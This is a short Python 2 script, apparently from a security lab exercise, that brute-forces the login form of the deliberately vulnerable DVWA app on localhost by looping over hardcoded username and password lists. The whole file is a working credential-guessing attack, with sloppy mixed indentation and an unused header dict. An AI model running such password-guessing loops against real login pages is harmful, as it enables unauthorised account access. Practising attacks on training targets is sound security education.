#!/usr/bin/python
import urllib3
http = urllib3.PoolManager()
users = ("usuario1","admin", "usuario2", "usuario3")
passwords = ("password1","password", "password2", "password3", "password4", "password5", "password6", "password7")

for user in users:
    for password in passwords:
        url = "http://localhost/dvwa/vulnerabilities/brute/?username=%s&password=%s&Login=Login#" %(user, password)
	head = {"Cookie":"PHPSESSID=ec11kdhmhma7gevprnu7tjacd2","Cookie":"security=low"}
    	r = http.request('GET', url, headers={'Cookie':'security=low; PHPSESSID=ec11kdhmhma7gevprnu7tjacd2'})
	html = r.data
        if "Username and/or password incorrect." not in html:
            print "Passwords encontrados --- %s : %s" %(user, password)


